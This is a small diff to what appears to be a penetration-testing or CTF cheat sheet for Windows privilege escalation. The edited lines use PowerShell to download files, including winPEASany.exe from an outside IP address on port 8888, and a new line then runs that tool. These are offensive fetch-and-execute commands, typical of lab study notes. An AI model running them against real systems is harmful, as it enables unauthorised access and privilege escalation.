@@ -59,10 +59,11 @@ PS > Invoke-Allchecks
 
 # Download file
 
-(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
+powershell (new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.121.196:8888/winPEASany.exe','C:\Users\bill\Desktop\winPEASany.exe')
+powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.121.196:8888/winPEASany.exe','C:\Users\bill\Desktop\winPEASany.exe')
 
 
+Start-Process "winPEASany.exe"
 
 
